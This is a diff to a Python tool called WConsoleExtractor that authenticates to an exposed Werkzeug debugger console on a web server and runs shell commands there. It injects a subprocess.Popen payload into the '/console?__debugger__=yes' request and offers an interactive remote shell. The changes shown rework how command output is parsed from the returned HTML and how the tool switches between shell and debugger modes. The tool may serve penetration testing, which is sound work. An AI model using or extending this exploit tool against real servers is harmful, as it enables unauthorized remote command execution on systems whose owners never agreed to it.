@@ -159,7 +159,7 @@ class WConsoleExtractor:
 
     @staticmethod
     def sanitize_output(output:str):
-        return output.replace("\\n", "\n")[1:-1]
+        return output.replace("\\n", "\n")[1:-1].strip()
     
     def get(self, path:str):
         return self.sess.get(f"{self.base_url}{path}")
@@ -376,7 +376,7 @@ class WConsoleExtractor:
             error("Error during authentication")
         return state["auth"]
     
-    def parse_html(self, content:str):
+    def parse_html(self, content:str) -> tuple[str, bool]:
         try:
             soup = bs(content, "html.parser")
             traceback = soup.find("div", attrs={"class":"traceback"})
@@ -389,14 +389,25 @@ class WConsoleExtractor:
             
                 if not err:
                     error("Unhandled error, please report the issue on tool's repository")
+                
+                output = "".join(err.contents)
             else:
-                res = content.split("\n")[1]
-                output = html.unescape(re.sub(r"<((?![<>]).)+>", "", res))
+                span = soup.find("span")
+
+                if span:
+                    extended = span.find("span", attrs={"class":"extended"})
+
+                    output = span.contents[0]
+
+                    if extended:
+                        output += extended.contents[0]
+                else:
+                    output = soup.contents[0].splitlines()[1]
+
         except Exception as e:
             error(e)
-            pass
         
-        return output.strip()
+        return output.strip(), traceback is not None
     
     def exec_console(self, code:str):
         self.authent()
@@ -406,7 +417,7 @@ class WConsoleExtractor:
         argv = cmd.split(' ')
         self.authent()
 
-        payload = f"import subprocess; subprocess.Popen({argv},stdout=subprocess.PIPE,stderr=subprocess.STDOUT).communicate()"
+        payload = f"import subprocess;subprocess.Popen({argv},stdout=subprocess.PIPE,stderr=subprocess.STDOUT).communicate()[0].decode()"
         url = f"/console?__debugger__=yes&cmd={payload}&frm=0&s={self.token}"
         res = self.get(url)
 
@@ -414,22 +425,11 @@ class WConsoleExtractor:
             error("Error while sending command, please report the issue on tool's repository")
             return
 
-        soup = bs(res.text, 'html.parser')
-        span = soup.find("span", attrs={"class":"string"})
-        traceback = soup.find("div", attrs={"class":"traceback"})
-
-        if span:
-            res = span.contents[0]
-            extended = span.find("span")
-            if extended:
-                res += extended.contents[0]
-            output = WConsoleExtractor.sanitize_output(res)
-        elif traceback:
-            err = traceback.find("blockquote")
-            output = err.contents[0]
-        else:
-            output = ""
-
+        output, err = self.parse_html(res.text)
+        
+        if err:
+            return output
+        
         return WConsoleExtractor.sanitize_output(output)
     
     def exec_dbg(self, code:str):
@@ -439,7 +439,7 @@ class WConsoleExtractor:
             error("Error while evaluating code, please report the issue on tool's repository")
             return
         
-        output = self.parse_html(res.text)
+        output, _ = self.parse_html(res.text)
         return output
     
     def shell(self):
@@ -458,12 +458,13 @@ class WConsoleExtractor:
                     continue
                 if cmd.strip() in switch_commands:
                     self.debugger()
+                    break
             except (KeyboardInterrupt, EOFError, SystemExit,IndexError):
                 break
             else:
                 output = self.exec_cmd(cmd)
                 if output.startswith("FileNotFoundError"):
-                    output = f"{cmd}: Command Not Found"
+                    output = f"{cmd}: command not found"
                 self.print(f"{output}\n")
         info("Shell Terminated")
 
@@ -483,6 +484,7 @@ class WConsoleExtractor:
                     continue
                 if code.strip() in switch_commands:
                     self.shell()
+                    exit()
             except (KeyboardInterrupt, EOFError, SystemExit):
                 break
             else:
